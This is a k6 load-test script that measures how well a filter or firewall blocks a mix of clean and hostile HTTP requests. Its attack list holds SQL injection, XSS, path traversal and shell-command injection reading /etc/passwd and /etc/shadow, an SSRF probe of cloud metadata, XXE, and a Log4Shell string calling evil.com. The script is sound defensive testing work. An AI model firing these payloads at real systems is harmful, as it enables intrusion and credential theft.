import http from 'k6/http';
import { check } from 'k6';
import { Counter, Trend } from 'k6/metrics';

const RPS = Number(__ENV.RPS || 500);
const DURATION = __ENV.DURATION || '30s';
const ATTACK_PCT = Number(__ENV.ATTACK_PCT || 60);
const TARGET = __ENV.TARGET || 'http://127.0.0.1:8080';

export const options = {
  scenarios: {
    mix: {
      executor: 'constant-arrival-rate',
      rate: RPS, timeUnit: '1s', duration: DURATION,
      preAllocatedVUs: Math.max(50, RPS / 10),
      maxVUs: Math.max(100, RPS / 4),
    },
  },
  thresholds: {
    http_req_failed: ['rate<1.0'],   // never fail the run; we report
  },
  noConnectionReuse: false,
};

const ATTACK = [
  ["GET", "/search?q=1%27+OR+%271%27%3D%271", null],
  ["GET", "/user?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", null],
  ["GET", "/page?n=%3Cscript%3Ealert(1)%3C/script%3E", null],
  ["POST", "/comment", "body=<img src=x onerror=alert(1)>"],
  ["GET", "/files?p=../../../etc/passwd", null],
  ["GET", "/files?p=..%2F..%2F..%2Fetc%2Fpasswd", null],
  ["GET", "/ping?host=127.0.0.1;cat+/etc/shadow", null],
  ["GET", "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", null],
  ["GET", "/.env", null],
  ["GET", "/wp-admin/setup-config.php", null],
  ["GET", "/.git/config", null],
  ["GET", "/admin/login", "User-Agent:sqlmap/1.7"],
  ["GET", "/admin?cmd=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fx%7D", null],
  ["POST", "/api/upload", "body=<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"],
  ["POST", "/api/update", 'body={"username":"x","is_admin":true,"role":"superuser"}'],
];
const CLEAN = [
  ["GET", "/", null],
  ["GET", "/index.html", null],
  ["GET", "/api/users/100", null],
  ["GET", "/api/products/list?page=1&sort=name", null],
  ["GET", "/static/main.js", null],
  ["GET", "/static/styles.css", null],
  ["GET", "/robots.txt", null],
  ["POST", "/api/login", "body=username=alice&password=correctbatteryhorse"],
  ["POST", "/api/orders", 'body={"id":42,"qty":3}'],
  ["GET", "/v2/api/blog/post-1", null],
];

const detectedAttacks = new Counter('detected_attacks');
const allowedAttacks  = new Counter('allowed_attacks');
const blockedClean    = new Counter('blocked_clean');
const allowedClean    = new Counter('allowed_clean');
const attackLatency   = new Trend('attack_latency_ms', true);
const cleanLatency    = new Trend('clean_latency_ms', true);

function pickFrom(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

export default function () {
  const isAttack = Math.random() * 100 < ATTACK_PCT;
  const [m, p, extra] = pickFrom(isAttack ? ATTACK : CLEAN);
  const url = TARGET + p;
  const params = { headers: { 'accept': '*/*' } };
  let body = null;
  if (extra && extra.startsWith('User-Agent:')) {
    params.headers['user-agent'] = extra.slice('User-Agent:'.length);
  } else if (extra && extra.startsWith('body=')) {
    body = extra.slice('body='.length);
    params.headers['content-type'] = body.trimStart().startsWith('{')
      ? 'application/json' : 'application/x-www-form-urlencoded';
  }
  const res = (m === 'POST') ? http.post(url, body, params) : http.get(url, params);
  const blocked = res.status === 401 || res.status === 403 || res.status === 429;
  if (isAttack) {
    attackLatency.add(res.timings.duration);
    if (blocked) detectedAttacks.add(1); else allowedAttacks.add(1);
  } else {
    cleanLatency.add(res.timings.duration);
    if (blocked) blockedClean.add(1); else allowedClean.add(1);
  }
  check(res, { 'response received': r => r.status > 0 });
}
